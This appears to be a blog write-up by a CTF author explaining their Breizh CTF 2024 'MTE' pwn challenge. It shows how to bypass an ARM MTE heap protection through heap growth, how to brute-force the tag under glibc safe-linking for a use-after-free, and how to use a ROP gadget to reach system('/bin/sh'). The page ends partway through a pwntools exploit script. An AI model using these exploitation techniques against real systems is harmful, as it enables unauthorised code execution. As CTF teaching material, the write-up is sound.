@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <script defer data-domain="itarow.xyz" src="https://plausible.itarow.xyz/js/plausible.js"></script>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Breizh CTF 2024 - Write-up MTE - Pwn | Itarow</title>
+  <link rel = 'canonical' href = 'https://blog.itarow.xyz/posts/bzhctf2024_mte/'>
+  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Breizh CTF 2024 - Write-up MTE - Pwn" />
+<meta property="og:description" content="Here is the write-up of MTE challenge which I created for the Breizh CTF 2024. This is a Pwn challenge classified as difficult/very difficult.
+Description Do you know MTE? It&#39;s a new feature on the latest ARM CPUs, no more exploitation in the heap, what happiness! I&#39;ve implemented it on top of glibc in a little binary emulated via qemu, so you can&#39;t pwn it, but ... Reverse For this challenge, we have an aarch64 binary, and from the description, we know it implicates implementation of MTE technology over glibc." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.itarow.xyz/posts/bzhctf2024_mte/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-05-26T17:57:09+02:00" />
+<meta property="article:modified_time" content="2024-05-26T17:57:09+02:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Breizh CTF 2024 - Write-up MTE - Pwn"/>
+<meta name="twitter:description" content="Here is the write-up of MTE challenge which I created for the Breizh CTF 2024. This is a Pwn challenge classified as difficult/very difficult.
+Description Do you know MTE? It&#39;s a new feature on the latest ARM CPUs, no more exploitation in the heap, what happiness! I&#39;ve implemented it on top of glibc in a little binary emulated via qemu, so you can&#39;t pwn it, but ... Reverse For this challenge, we have an aarch64 binary, and from the description, we know it implicates implementation of MTE technology over glibc."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://blog.itarow.xyz/css/styles.4dd8e96d6c0d53a6965a5a357c26fc29f6b838ad352dc5acda0754ff4b9409e5c58fa94716892c2a5d6a7e1b1bef8fbcaf2442656e81dfae00dc9464d707477d.css" integrity="sha512-TdjpbWwNU6aWWlo1fCb8Kfa4OK01LcWs2gdU/0uUCeXFj6lHFoksKl1qfhsb74&#43;8ryRCZW6B364A3JRk1wdHfQ=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://blog.itarow.xyz/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://blog.itarow.xyz/posts/bzhctf2024_tampered/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&text=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&title=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&is_video=false&description=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&title=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&title=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&name=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn&description=Here%20is%20the%20write-up%20of%20MTE%20challenge%20which%20I%20created%20for%20the%20Breizh%20CTF%202024.%20This%20is%20a%20Pwn%20challenge%20classified%20as%20difficult%2fvery%20difficult.%0aDescription%20Do%20you%20know%20MTE%3f%20It%26%2339%3bs%20a%20new%20feature%20on%20the%20latest%20ARM%20CPUs%2c%20no%20more%20exploitation%20in%20the%20heap%2c%20what%20happiness%21%20I%26%2339%3bve%20implemented%20it%20on%20top%20of%20glibc%20in%20a%20little%20binary%20emulated%20via%20qemu%2c%20so%20you%20can%26%2339%3bt%20pwn%20it%2c%20but%20...%20Reverse%20For%20this%20challenge%2c%20we%20have%20an%20aarch64%20binary%2c%20and%20from%20the%20description%2c%20we%20know%20it%20implicates%20implementation%20of%20MTE%20technology%20over%20glibc." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_mte%2f&t=Breizh%20CTF%202024%20-%20Write-up%20MTE%20-%20Pwn" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#reverse">Reverse</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#final-exploit">Final exploit</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Breizh CTF 2024 - Write-up MTE - Pwn
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2024-05-26 17:57:09 &#43;0200 CEST" itemprop="datePublished">2024-05-26</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          7 minute read
+        </div>
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/bzhctf-2024">BZHCTF 2024</a>
+            
+        </div>
+        
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p>Here is the write-up of MTE challenge which I created for the Breizh CTF 2024. This is a Pwn challenge classified as difficult/very difficult.</p>
+<h2 id="description">Description</h2>
+<pre tabindex="0"><code>Do you know MTE? It&#39;s a new feature on the latest ARM CPUs, no more exploitation in the heap, what happiness! 
+
+I&#39;ve implemented it on top of glibc in a little binary emulated via qemu, so you can&#39;t pwn it, but ...
+</code></pre><h2 id="reverse">Reverse</h2>
+<p>For this challenge, we have an aarch64 binary, and from the description, we know it implicates implementation of MTE technology over glibc. First, what is MTE : <a href="https://docs.kernel.org/arch/arm64/memory-tagging-extension.html">MTE</a> for Memory Tagging Extension is a technology to protect Heap memory layouts. Thos layouts use allocations and deallocations, and bad implementation by developers involves vulnerabilities like overflows, double free, etc&hellip;</p>
+<p>The principle is to use CPU instructions to tag some memory regions. Those tags will be stored on the top byte of an address. All access to the tagged memories must be with the tag on the address (which is ignored by other instructions). Here is a good link to explain this : <a href="https://hackmd.io/@mhyang/rJ5JOnWvv">https://hackmd.io/@mhyang/rJ5JOnWvv</a> with good schemas to illustrate it:</p>
+<p><img src="/img/bzhctf2024_mte/1.png" alt=""></p>
+<p><img src="/img/bzhctf2024_mte/2.png" alt=""></p>
+<p>This feature is pretty strong and is going to be a game changer on heap exploitations during the next years. MTE is only implemented fully in GrapeheneOS with their custom allocator and Google Pixel 8.</p>
+<p>Now let&rsquo;s use IDA to view the implementation:</p>
+<p><img src="/img/bzhctf2024_mte/3.png" alt=""></p>
+<p><img src="/img/bzhctf2024_mte/4.png" alt=""></p>
+<p>There are some init functions calls and a menu of options :</p>
+<ul>
+<li>We could allocate data with the function <code>secure_malloc</code> (max size 0x100)</li>
+<li>We could free data with the function <code>secure_free</code> (no check on the index)</li>
+<li>We could edit data of an allocation</li>
+<li>We could print data of an allocation</li>
+<li>We could exit the program</li>
+</ul>
+<p>Basically there are not many checks, all allocations are in a global array which saves the data size and the pointer to the data. In appearance, we could do some use after free, double free, but let&rsquo;s see the <code>secure_malloc</code> and <code>secure_free</code> functions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">secure_malloc</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v1; <span style="color:#75715e">// x0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(a1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mte_tag</span>(v1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">16</span>, a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">secure_free</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">int</span> a2)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> tag; <span style="color:#75715e">// [xsp+26h] [xbp+26h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [xsp+28h] [xbp+28h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr; <span style="color:#75715e">// [xsp+30h] [xbp+30h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> a1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFFFLL</span>;
+</span></span><span style="display:flex;"><span>  tag <span style="color:#f92672">=</span> <span style="color:#a6e22e">mte_get_tag</span>(a1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    ptr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">mte_tag</span>(v4 <span style="color:#f92672">-</span> <span style="color:#ae81ff">16</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(a2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>)) <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( tag <span style="color:#f92672">==</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)<span style="color:#a6e22e">mte_get_tag</span>(ptr) );
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(ptr);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">mte_tag</span>(<span style="color:#66d9ef">__int64</span> _X0, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> size)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v9; <span style="color:#75715e">// [xsp+8h] [xbp-18h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v10; <span style="color:#75715e">// [xsp+10h] [xbp-10h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> i; <span style="color:#75715e">// [xsp+18h] [xbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__asm</span> { IRG             X0, X0 }
+</span></span><span style="display:flex;"><span>  v9 <span style="color:#f92672">=</span> _X0;
+</span></span><span style="display:flex;"><span>  v10 <span style="color:#f92672">=</span> _X0;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; i <span style="color:#f92672">&lt;</span> size; i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">16LL</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    _X0 <span style="color:#f92672">=</span> v10;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">__asm</span> { STG             X0, [X0],<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x10</span> }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v9;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>secure_malloc</code> function uses malloc from glibc to allocate a chunk and the <code>mte_tag</code> function to tag the zone and get the pointer with the tag. <code>IRG</code> instruction is used to change the pointer with a random tag, and <code>STG</code>is used to tag the zone with the key for 16 bytes.</p>
+<p>The <code>secure_free</code>function use free from glibc to unallocate the chunk, but before it tags the chunk memory with a new tag (and it verifies if the new tag is different from the oldest).</p>
+<p>There are no evident vulnerabilities in the implementation, except for the padding of 16 bytes before and after the return pointer of malloc maybe change a part of the tag of other chunks. (But actually, there is no heap overflow, and it would be complicated to do something from this)</p>
+<p>The repetition of the tag could have been a vulnerability but the check on the new generated tag block this. (1/16 chance to have the same tag which could allows UAF).</p>
+<p>Let&rsquo;s review the functions to see if there are no strange behaviors or lines of codes.
+At the start of the process function :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x20uLL</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mprotect</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(v5 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFF000LL</span>), <span style="color:#ae81ff">0x21000uLL</span>, <span style="color:#ae81ff">35</span>) )
+</span></span></code></pre></div><p>Why the use of mprotect ? If we see some basic implementations of MTE on internet, we could see people using <code>mmap</code> to allocate the zone to applicate MTE. (<a href="https://8ksec.io/arm64-reversing-and-exploitation-part-10-intro-to-arm-memory-tagging-extension-mte/">https://8ksec.io/arm64-reversing-and-exploitation-part-10-intro-to-arm-memory-tagging-extension-mte/</a>)</p>
+<p>They use the flag <code>PROT_MTE</code> to apply the MTE protection to the zone. If we refer to the hackmd article above, which also explain MTE :</p>
+<blockquote>
+<p>with a special flag, PROT_MTE, the reserved memory has tagging effects enabled</p>
+</blockquote>
+<p>This flag activates the protection. In our case, the flag is set with the mprotect call with <code>0x23</code> as flag value (0x20 = PROT_MTE):</p>
+<pre tabindex="0"><code>Python&gt;bin(0x23)
+&#39;0b100011&#39;
+Python&gt;bin(0x20)
+&#39;0b100000&#39;
+</code></pre><p>The pointer where there is the call is a heap pointer (see malloc call above) with some bits masked. It is clearly the heap base address. The size used is the size of the section (<code>0x21000</code>). But wait? The heap is not at a static value, the heap is dynamic and can expand. If we do many allocations to expand the heap, try to free a chunk and edit it (UAF) and check if the program crashes ?</p>
+<p>This works! No crash in the zone where the chunk is free because it doesn&rsquo;t have MTE properties so MTE didn&rsquo;t trigger.</p>
+<blockquote>
+<p>In fact, the extension of the heap by the libc doesn&rsquo;t put MTE protection flag on it by default.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># grow up heap to bypass mprotect restricted range</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">500</span>):
+</span></span><span style="display:flex;"><span>    alloc(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0x100</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;TEST&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>We could bypass MTE protection with this and make use after free for example.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>The thing to notice is the binary is run with <code>qemu-aarch64</code> and there is no ASLR with the emulated aarch64 process.</p>
+<p>All chunk sizes are restricted by 0x100 of size so when freed, there will be in tcachebins or fastbins which are simple linked list. With the use after free, we could change the linked list forward pointer to control where we allocate the next chunk.</p>
+<p>What is the libc version? <code>GNU C Library (Ubuntu GLIBC 2.35-0ubuntu1) stable release version 2.35.</code></p>
+<p>We are going to dig with <a href="https://ir0nstone.gitbook.io/notes/types/heap/safe-linking">heap safe linking</a>.</p>
+<blockquote>
+<p>The theory is to protect the fd pointer of free chunks in these bins with a mangling operation, making it more difficult to overwrite it with an arbitrary value.</p>
+</blockquote>
+<p>This is the operations :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define PROTECT_PTR(pos, ptr) \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
+</span></span></span></code></pre></div><p>Where pos is the value and ptr the key. The key is the heap pointer used when free is called. So the key used will contain the tag from MTE implementation. We know this is a value in 16bits from 0x1 to 0xf. We have no choice, we need to bruteforce this value to create the pointer we needs for the use after free to alloc where we want. We have one chance in sixteen, that&rsquo;s not bad.</p>
+<p>We only have to take one heap address used by secure_free and use it for the bruteforce by mangle this pointer with our target destination FD.</p>
+<p>Where to allocate? We have one anywhere arbitrary write, the simple way to get a shell is to overwrite the return address of the main function with our ROP Chain.</p>
+<p>For the address to use, there&rsquo;s no good gadget on aarch64 glib 2.35 so we need to find a good candidate to ROP to call <code>system(&quot;/bin/sh&quot;)</code>.</p>
+<p>There&rsquo;s a perfect one I already use on this challenge : <a href="https://blog.itarow.xyz/posts/pacapable/">https://blog.itarow.xyz/posts/pacapable/</a> :</p>
+<pre tabindex="0"><code>ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;
+</code></pre><p>It allows to put &ldquo;/bin/sh&rdquo; ptr to x0 (first argument) and jump on system function.</p>
+<p>Run the exploit :</p>
+<p><img src="/img/bzhctf2024_mte/5.png" alt=""></p>
+<p>Flag : <code>BZHCTF{DumB_1mpl_&amp;_BF_R1P_MTE}</code></p>
+<h2 id="final-exploit">Final exploit</h2>
+<p>Here is the full script :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Usage solve.py &lt;host&gt; &lt;port&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>_, host, port <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;new-window&#34;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level = &#39;info&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./mte&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># change -l0 to -l1 for more gadgets</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">one_gadget</span>(filename, base_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> [(int(i)<span style="color:#f92672">+</span>base_addr) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> subprocess<span style="color:#f92672">.</span>check_output([<span style="color:#e6db74">&#39;one_gadget&#39;</span>, <span style="color:#e6db74">&#39;--raw&#39;</span>, <span style="color:#e6db74">&#39;-l0&#39;</span>, filename])<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logbase</span>(): log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc base = </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> libc<span style="color:#f92672">.</span>address)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logleak</span>(name, val): info(name<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; = </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> val)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sla</span>(delim,line): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>sendlineafter(delim,line)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sl</span>(line): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>sendline(line)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rcu</span>(delim): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recvuntil(delim)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rcv</span>(number): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recv(number)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rcvl</span>(): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> io
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#if args.GDB:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#    io = process([&#34;qemu-aarch64&#34;,&#34;-g&#34;,&#34;1234&#34;,exe.path])</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#elif args.REMOTE:</span>
+</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(host, int(port))
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#else:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#    io = process([&#34;qemu-aarch64&#34;,exe.path])</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> io
+</span></span><span style="display:flex;"><span>
